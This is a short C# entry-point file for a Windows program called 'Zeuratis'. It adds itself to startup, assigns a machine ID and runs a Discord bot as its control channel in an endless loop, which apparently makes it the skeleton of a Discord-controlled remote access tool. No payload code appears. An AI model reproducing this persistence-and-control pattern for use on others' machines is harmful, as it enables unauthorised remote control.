namespace Zeuratis;

class ZeuratisEntry
{ 
    [SupportedOSPlatform("windows")]
    public static void Main()
    {      
        if (!Directory.Exists("tempfile"))
        {
            Directory.CreateDirectory("tempfile");
        }

        ZeuratisSetup.GetDefaultId();
        Zeuratis.AddToStartUp();
        Task.Run(() => DiscordBot.Login());

        if (!Settings.GetConfigureState(false))
        {
            DiscordBot.Setup().Wait();
        }

        while (true) { }
        
    }
}
